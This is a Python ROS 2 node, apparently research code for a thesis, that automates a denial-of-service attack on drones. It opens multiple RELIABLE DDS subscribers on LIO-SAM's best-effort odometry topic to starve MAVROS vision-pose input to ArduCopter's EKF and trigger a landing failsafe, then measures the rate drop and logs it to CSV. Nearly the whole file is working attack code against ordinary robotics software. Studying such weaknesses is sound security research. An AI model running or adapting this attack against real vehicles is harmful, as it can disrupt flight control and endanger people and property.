#!/usr/bin/env python3
"""
Layer 2 Attack: QoS Profile Poisoning — Vision Pose Starvation

Creates a RELIABLE subscriber on LIO-SAM's BEST_EFFORT odometry topic.
DDS must satisfy the stricter QoS policy, which causes the publisher to
buffer/retry messages instead of fire-and-forget. This degrades the
odometry output rate, starving MAVROS's vision_pose bridge below
ArduCopter's EKF3 minimum threshold (default 0.5 Hz), which triggers
a Land Mode failsafe.

Attacker model: network participant that can SUBSCRIBE to any DDS topic
(SROS2 disabled). No interception, modification, or reconfiguration of
victim systems required. One subscribe command is all it takes.

This node automates the attack AND collects metrics:
  1. Baseline phase: measures vision_pose rate for N seconds (no attack)
  2. Attack phase: creates RELIABLE subscriber, measures rate drop
  3. Recovery phase: destroys subscriber, measures rate recovery
  4. Logs all metrics to CSV for thesis data collection

Usage:
  ros2 run swarm_mission qos_poisoner --ros-args \
    -p target_drone:=drone1 \
    -p baseline_duration:=15.0 \
    -p attack_duration:=45.0 \
    -p recovery_duration:=15.0

Output:
  - Console: real-time rate measurements
  - CSV: ~/qos_attack_metrics_<drone>_<timestamp>.csv
"""
import csv
import os
import time
from datetime import datetime

import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy, DurabilityPolicy
from geometry_msgs.msg import PoseStamped
from nav_msgs.msg import Odometry


class QoSPoisoner(Node):
    def __init__(self):
        super().__init__('qos_poisoner')

        # ---- Parameters ----
        self.declare_parameter('target_drone', 'drone1')
        self.declare_parameter('baseline_duration', 15.0)
        self.declare_parameter('attack_duration', 45.0)
        self.declare_parameter('recovery_duration', 15.0)
        self.declare_parameter('rate_window', 3.0)  # sliding window for Hz calc
        self.declare_parameter('num_reliable_subs', 5)  # how many RELIABLE subs
        self.declare_parameter('output_dir', os.path.expanduser('~'))

        self.target_drone = self.get_parameter('target_drone').value
        self.baseline_dur = self.get_parameter('baseline_duration').value
        self.attack_dur = self.get_parameter('attack_duration').value
        self.recovery_dur = self.get_parameter('recovery_duration').value
        self.rate_window = self.get_parameter('rate_window').value
        self.num_reliable_subs = self.get_parameter('num_reliable_subs').value
        self.output_dir = self.get_parameter('output_dir').value

        # ---- Topics ----
        # LIO-SAM odometry (the attack target — published BEST_EFFORT)
        self.odom_topic = f'/{self.target_drone}/lio_sam/mapping/odometry_incremental'

        # Vision pose (what we monitor — this is what feeds ArduCopter's EKF)
        if self.target_drone == 'drone1':
            self.vision_pose_topic = '/mavros/vision_pose/pose'
        else:
            self.vision_pose_topic = f'/{self.target_drone}/mavros/vision_pose/pose'

        # ---- State ----
        self.phase = 'baseline'  # baseline → attack → recovery → done
        self.phase_start_time = None
        self.attack_subs = []  # RELIABLE subscribers (the poison)

        # Rate tracking
        self.vision_pose_times = []  # timestamps of received vision_pose msgs
        self.odom_times = []  # timestamps of received odom msgs

        # Metrics log
        self.metrics = []  # list of dicts for CSV
        self.metric_interval = 1.0  # log metrics every N seconds
        self.last_metric_time = 0.0

        # ---- Monitor subscriber (BEST_EFFORT — benign, just for measurement) ----
        qos_monitor = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5)

        self.vision_pose_sub = self.create_subscription(
            PoseStamped, self.vision_pose_topic,
            self.vision_pose_callback, qos_monitor)

        self.odom_monitor_sub = self.create_subscription(
            Odometry, self.odom_topic,
            self.odom_callback, qos_monitor)

        # ---- Timer for phase management ----
        self.phase_timer = self.create_timer(0.5, self.phase_tick)

        # ---- CSV setup ----
        timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.csv_path = os.path.join(
            self.output_dir,
            f'qos_attack_metrics_{self.target_drone}_{timestamp_str}.csv')

        self.get_logger().info(
            f'=== QoS Profile Poisoning Attack ===\n'
            f'  Target: {self.target_drone}\n'
            f'  Odom topic (attack): {self.odom_topic}\n'
            f'  Vision pose (monitor): {self.vision_pose_topic}\n'
            f'  Reliable subscribers: {self.num_reliable_subs}\n'
            f'  Phases: baseline={self.baseline_dur}s, '
            f'attack={self.attack_dur}s, recovery={self.recovery_dur}s\n'
            f'  CSV output: {self.csv_path}\n'
            f'  Starting BASELINE phase...')

        self.phase_start_time = time.monotonic()

    # ---- Callbacks (just record timestamps) ----

    def vision_pose_callback(self, msg: PoseStamped):
        now = time.monotonic()
        self.vision_pose_times.append(now)
        # Prune old entries
        cutoff = now - self.rate_window * 2
        self.vision_pose_times = [t for t in self.vision_pose_times if t > cutoff]

    def odom_callback(self, msg: Odometry):
        now = time.monotonic()
        self.odom_times.append(now)
        cutoff = now - self.rate_window * 2
        self.odom_times = [t for t in self.odom_times if t > cutoff]

    # ---- Rate calculation ----

    def _calc_rate(self, timestamps):
        """Calculate message rate (Hz) over the sliding window."""
        now = time.monotonic()
        cutoff = now - self.rate_window
        recent = [t for t in timestamps if t > cutoff]
        if len(recent) < 2:
            return 0.0
        duration = recent[-1] - recent[0]
        if duration <= 0:
            return 0.0
        return (len(recent) - 1) / duration

    # ---- Phase management ----

    def phase_tick(self):
        now = time.monotonic()
        elapsed = now - self.phase_start_time

        vision_rate = self._calc_rate(self.vision_pose_times)
        odom_rate = self._calc_rate(self.odom_times)

        # Log metrics periodically
        if now - self.last_metric_time >= self.metric_interval:
            self.last_metric_time = now
            total_elapsed = now - self.phase_start_time
            # Compute total elapsed from very start
            metric = {
                'timestamp': datetime.now().isoformat(),
                'phase': self.phase,
                'phase_elapsed_s': round(elapsed, 2),
                'vision_pose_hz': round(vision_rate, 3),
                'odom_hz': round(odom_rate, 3),
            }
            self.metrics.append(metric)

            status_char = {
                'baseline': '[B]',
                'attack': '[A]',
                'recovery': '[R]',
            }.get(self.phase, '[?]')

            self.get_logger().info(
                f'{status_char} {elapsed:.0f}s | '
                f'vision_pose: {vision_rate:.2f} Hz | '
                f'odom: {odom_rate:.2f} Hz')

        # Phase transitions
        if self.phase == 'baseline' and elapsed >= self.baseline_dur:
            self._start_attack()
        elif self.phase == 'attack' and elapsed >= self.attack_dur:
            self._start_recovery()
        elif self.phase == 'recovery' and elapsed >= self.recovery_dur:
            self._finish()

    def _start_attack(self):
        self.phase = 'attack'
        self.phase_start_time = time.monotonic()

        self.get_logger().warn(
            f'=== ATTACK PHASE — Creating {self.num_reliable_subs} '
            f'RELIABLE subscribers on {self.odom_topic} ===')

        # Create multiple RELIABLE subscribers — this is the attack
        qos_poison = QoSProfile(
            reliability=ReliabilityPolicy.RELIABLE,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=100)  # large depth to force buffering

        for i in range(self.num_reliable_subs):
            sub = self.create_subscription(
                Odometry, self.odom_topic,
                lambda msg: None,  # discard — we just need the QoS negotiation
                qos_poison)
            self.attack_subs.append(sub)

        self.get_logger().warn(
            f'  {len(self.attack_subs)} RELIABLE subscribers active. '
            f'Monitoring rate impact...')

    def _start_recovery(self):
        self.phase = 'recovery'
        self.phase_start_time = time.monotonic()

        self.get_logger().warn(
            f'=== RECOVERY PHASE — Destroying RELIABLE subscribers ===')

        # Destroy the poison subscribers
        for sub in self.attack_subs:
            self.destroy_subscription(sub)
        self.attack_subs.clear()

        self.get_logger().warn(
            f'  All attack subscribers destroyed. Monitoring recovery...')

    def _finish(self):
        self.phase = 'done'
        self.phase_timer.cancel()

        # Write CSV
        self._write_csv()

        # Compute summary statistics
        baseline_rates = [m['vision_pose_hz'] for m in self.metrics
                          if m['phase'] == 'baseline' and m['phase_elapsed_s'] > 3]
        attack_rates = [m['vision_pose_hz'] for m in self.metrics
                        if m['phase'] == 'attack' and m['phase_elapsed_s'] > 3]
        recovery_rates = [m['vision_pose_hz'] for m in self.metrics
                          if m['phase'] == 'recovery' and m['phase_elapsed_s'] > 3]

        def avg(lst):
            return sum(lst) / len(lst) if lst else 0.0

        def minimum(lst):
            return min(lst) if lst else 0.0

        baseline_avg = avg(baseline_rates)
        attack_avg = avg(attack_rates)
        attack_min = minimum(attack_rates)
        recovery_avg = avg(recovery_rates)

        rate_drop_pct = ((baseline_avg - attack_avg) / baseline_avg * 100
                         if baseline_avg > 0 else 0)

        # Time to first rate below EKF threshold (0.5 Hz)
        time_to_threshold = None
        for m in self.metrics:
            if m['phase'] == 'attack' and m['vision_pose_hz'] < 0.5:
                time_to_threshold = m['phase_elapsed_s']
                break

        threshold_str = (f'{time_to_threshold:>5.1f}s'
                         if time_to_threshold is not None else '  N/A ')

        self.get_logger().warn(
            f'\n'
            f'╔══════════════════════════════════════════╗\n'
            f'║        QoS POISONING ATTACK RESULTS      ║\n'
            f'╠══════════════════════════════════════════╣\n'
            f'║ Target: {self.target_drone:<33}║\n'
            f'║ Baseline vision_pose:  {baseline_avg:>6.2f} Hz avg     ║\n'
            f'║ Attack vision_pose:    {attack_avg:>6.2f} Hz avg     ║\n'
            f'║ Attack vision_pose:    {attack_min:>6.2f} Hz min     ║\n'
            f'║ Rate drop:             {rate_drop_pct:>6.1f}%           ║\n'
            f'║ Recovery vision_pose:  {recovery_avg:>6.2f} Hz avg     ║\n'
            f'║ Time to <0.5 Hz:       {threshold_str}              ║\n'
            f'╚══════════════════════════════════════════╝\n'
            f'\n'
            f'CSV saved: {self.csv_path}')

    def _write_csv(self):
        if not self.metrics:
            return
        fieldnames = ['timestamp', 'phase', 'phase_elapsed_s',
                      'vision_pose_hz', 'odom_hz']
        try:
            with open(self.csv_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(self.metrics)
            self.get_logger().info(f'Wrote {len(self.metrics)} rows to {self.csv_path}')
        except Exception as e:
            self.get_logger().error(f'Failed to write CSV: {e}')


def main(args=None):
    rclpy.init(args=args)
    node = QoSPoisoner()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        if node.phase != 'done':
            node.get_logger().warn('Interrupted — writing partial metrics...')
            node._write_csv()
        node.get_logger().info(
            f'Shutting down — {len(node.metrics)} metric samples collected')
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
